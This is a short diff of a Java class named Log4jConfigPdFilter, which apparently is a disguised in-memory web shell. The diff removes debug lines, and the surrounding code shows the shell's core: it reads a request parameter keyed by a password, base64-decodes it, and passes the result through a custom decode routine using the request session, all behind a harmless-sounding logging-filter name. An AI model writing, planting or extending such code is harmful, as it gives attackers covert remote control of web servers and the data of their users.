@@ -6,11 +6,8 @@ public class Log4jConfigPdFilter extends ClassLoader{
 
     private static final java.util.Map<ClassLoader, Log4jConfigPdFilter> CACHE = new java.util.concurrent.ConcurrentHashMap<>();
 
-    private static ClassLoader requestClassLoader;
 
     public static Log4jConfigPdFilter getInstance(ClassLoader loader) {
-        System.out.println("Log4jConfigPdFilter#loader = " + loader);
-        requestClassLoader = loader;
         return CACHE.computeIfAbsent(loader, k -> new Log4jConfigPdFilter(loader));
     }
 
@@ -84,7 +81,6 @@ public class Log4jConfigPdFilter extends ClassLoader{
             Method getSession = reqClass.getMethod("getSession");
             Object sessionClass = getSession.invoke(requestObj);
 
-//
             java.lang.reflect.Method getParam = reqClass.getMethod("getParameter", String.class);
             byte[] data = this.base64Decode((String)getParam.invoke(requestObj, pass));
             data = this.x(data, false);
